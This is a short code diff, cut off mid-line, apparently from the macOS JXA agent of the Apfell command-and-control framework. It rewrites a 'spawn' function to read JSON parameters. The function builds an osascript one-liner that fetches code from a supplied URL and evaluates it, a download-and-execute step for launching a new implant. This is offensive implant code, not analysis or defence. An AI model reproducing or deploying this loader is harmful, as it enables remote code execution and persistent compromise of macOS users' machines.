@@ -1,10 +1,10 @@
 exports.spawn = function(task, command, params){
-    split_params = params.split(" ");
-    if(split_params[0] == "shell_api"){
-        if(split_params[1] == "oneliner"){
-            if(split_params[2] == "apfell-jxa"){
+    config = JSON.parse(params);
+    if(config['method'] == "shell_api"){
+        if(config['type'] == "oneliner"){
+            if(config['payload-type'] == "apfell-jxa"){
                 //full_url = C2.baseurl + "api/v1.0/payloads/get/" + split_params[3];
-                full_url = split_params[3];
+                full_url = config['url'];
                 path = "/usr/bin/osascript";
                 args = ['-l','JavaScript','-e'];
                 command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
